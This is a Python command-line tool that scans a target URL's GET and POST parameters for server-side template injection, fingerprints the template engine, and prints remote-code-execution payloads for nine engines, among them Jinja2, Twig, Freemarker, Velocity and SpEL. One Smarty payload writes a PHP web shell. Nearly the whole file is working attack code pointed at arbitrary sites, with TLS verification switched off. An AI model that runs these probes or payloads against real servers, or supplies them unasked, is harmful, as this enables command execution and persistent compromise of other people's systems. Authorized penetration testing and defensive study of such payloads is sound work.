#!/usr/bin/env python3
"""XC SSTI — Server-Side Template Injection Hunter"""

import sys, ssl, re, time, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse, urlencode, parse_qs

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{R}
╔═╗╔═╗╔╦╗╦
╚═╗╚═╗ ║ ║
╚═╝╚═╝ ╩ ╩  {Y}→ RCE{RST}
{DIM}Server-Side Template Injection — XC Hub{RST}
"""

# Detection probes — send and look for evaluated result
DETECT_PROBES = [
    # (payload, expected_result_pattern, engine_hint)
    ('{{7*7}}',           r'49',        'Jinja2/Twig/generic'),
    ('${7*7}',            r'49',        'Freemarker/Spring/EL'),
    ('#{7*7}',            r'49',        'Ruby ERB / Pebble'),
    ('<%= 7*7 %>',        r'49',        'ERB/EJS'),
    ('{{7*\'7\'}}',       r'7777777',   'Twig'),
    ('{{7*"7"}}',         r'49',        'Jinja2'),
    ('{7*7}',             r'49',        'Smarty'),
    ('${{7*7}}',          r'49',        'Pebble/Kotlin'),
    ('%{7*7}',            r'49',        'Velocity/Struts'),
    ('*{7*7}',            r'49',        'Spring SpEL'),
    ('@(7*7)',             r'49',        'Razor'),
    ('{{=7*7}}',          r'49',        'Nunjucks variant'),
    ('{#7*7#}',           r'49',        'Dust.js'),
    ('[[7*7]]',           r'49',        'Velocity'),
    ('\${7*7}',           r'49',        'FTL escape'),
]

# RCE payloads per engine
RCE_PAYLOADS = {
    'Jinja2': [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{'id'|popen|readlines}}",
        "{{''.__class__.mro()[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
    ],
    'Twig': [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}",
        "{{['id']|map('system')|join}}",
        "{{{'id':0}|sort('system')}}",
    ],
    'Freemarker': [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
    ],
    'Velocity': [
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    'ERB': [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
    ],
    'Spring SpEL': [
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}",
    ],
    'Smarty': [
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    'Pebble': [
        "{% set cmd = 'id' %}{%set output = cmd | raw %}{{ output }}",
    ],
    'Mako': [
        "${__import__('os').popen('id').read()}",
    ],
}

ERROR_PATTERNS = {
    'Jinja2':     [r'jinja2', r'TemplateSyntaxError', r'UndefinedError'],
    'Twig':       [r'Twig_Error', r'twig', r'TwigLoaderError'],
    'Freemarker': [r'freemarker', r'FreeMarker', r'ParseException'],
    'Velocity':   [r'velocity', r'VelocityException'],
    'ERB':        [r'ActionView::Template::Error', r'erb'],
    'Spring':     [r'SpelParseException', r'EvaluationException', r'springframework'],
    'Smarty':     [r'SmartyException', r'smarty'],
    'Pebble':     [r'PebbleException'],
    'Mako':       [r'mako', r'MakoException'],
    'Tornado':    [r'tornado', r'parse error'],
    'Django':     [r'django', r'TemplateSyntaxError'],
}

def fetch(url, timeout=10):
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*'}
    req = Request(url, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512*1024).decode('utf-8', errors='ignore')
            return r.status, body
    except HTTPError as e:
        try: body = e.read(8192).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body
    except Exception:
        return None, ''

def post_fetch(url, data, timeout=10):
    h = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
    body_bytes = urlencode(data).encode()
    req = Request(url, data=body_bytes, headers=h, method='POST')
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512*1024).decode('utf-8', errors='ignore')
            return r.status, body
    except HTTPError as e:
        try: body = e.read(8192).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body
    except Exception:
        return None, ''

def inject_param(base_url, param, payload):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

def detect_engine_from_error(body):
    for engine, patterns in ERROR_PATTERNS.items():
        for p in patterns:
            if re.search(p, body, re.IGNORECASE):
                return engine
    return None

def probe_param(base_url, param, method='GET'):
    print(f"\n  {C}Param: {W}{param}{RST} [{method}]")
    confirmed_engine = None
    for payload, expected, hint in DETECT_PROBES:
        if method == 'GET':
            url = inject_param(base_url, param, payload)
            status, body = fetch(url)
        else:
            status, body = post_fetch(base_url, {param: payload})

        if body and re.search(expected, body):
            print(f"  {R}[SSTI CONFIRMED]{RST} payload={C}{payload}{RST} → result matched {Y}{expected}{RST}")
            print(f"  {Y}Engine hint: {hint}{RST}")
            engine_from_err = detect_engine_from_error(body)
            confirmed_engine = engine_from_err or hint.split('/')[0]
            break
        elif body:
            engine_from_err = detect_engine_from_error(body)
            if engine_from_err:
                print(f"  {Y}[!]{RST} Error pattern → {engine_from_err}")
        time.sleep(0.1)
    return confirmed_engine

def show_rce_payloads(engine):
    print(f"\n{BOLD}{B}━━━ RCE PAYLOADS FOR {engine.upper()} ━━━{RST}")
    key = next((k for k in RCE_PAYLOADS if k.lower() in engine.lower()), None)
    if key:
        for i, p in enumerate(RCE_PAYLOADS[key], 1):
            print(f"\n  {R}[{i}]{RST} {W}{p}{RST}")
    else:
        print(f"  {DIM}No RCE payloads stored for {engine} — check HackTricks{RST}")
        print(f"\n  Generic probe: try injecting os.popen/system/exec based on engine")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC SSTI Hunter')
    parser.add_argument('target', help='Target URL (e.g. https://site.com/page?name=test)')
    parser.add_argument('--params', help='Comma-separated params (default: all from URL)')
    parser.add_argument('--post', help='Comma-separated POST params to test')
    parser.add_argument('--rce', help='Show RCE payloads for engine (e.g. Jinja2)')
    args = parser.parse_args()

    if args.rce:
        show_rce_payloads(args.rce)
        return

    target = args.target
    if not target.startswith('http'):
        target = 'https://' + target
    parsed = urlparse(target)
    url_params = list(parse_qs(parsed.query).keys())

    if args.params:
        get_params = [p.strip() for p in args.params.split(',')]
    elif url_params:
        get_params = url_params
    else:
        get_params = ['q', 'search', 'name', 'input', 'template', 'page', 'lang', 'msg', 'text', 'content']

    post_params = [p.strip() for p in args.post.split(',')] if args.post else []

    print(f"{BOLD}Target:{RST} {W}{target}{RST}")
    print(f"{BOLD}GET params:{RST} {W}{', '.join(get_params)}{RST}")
    if post_params:
        print(f"{BOLD}POST params:{RST} {W}{', '.join(post_params)}{RST}")

    print(f"\n{BOLD}{B}━━━ SSTI DETECTION PROBES ━━━{RST}")
    found_engines = []

    for param in get_params:
        engine = probe_param(target, param, 'GET')
        if engine:
            found_engines.append(engine)

    for param in post_params:
        engine = probe_param(target, param, 'POST')
        if engine:
            found_engines.append(engine)

    if found_engines:
        for eng in set(found_engines):
            show_rce_payloads(eng)
    else:
        print(f"\n  {G}No SSTI detected in tested params{RST}")
        print(f"  {DIM}Try: --params name,template,msg,lang,content or --post body,message{RST}")

    print(f"\n{DIM}Tip: python3 ssti.py <url> --rce Jinja2  → show RCE payloads directly{RST}\n")

if __name__ == '__main__':
    main()
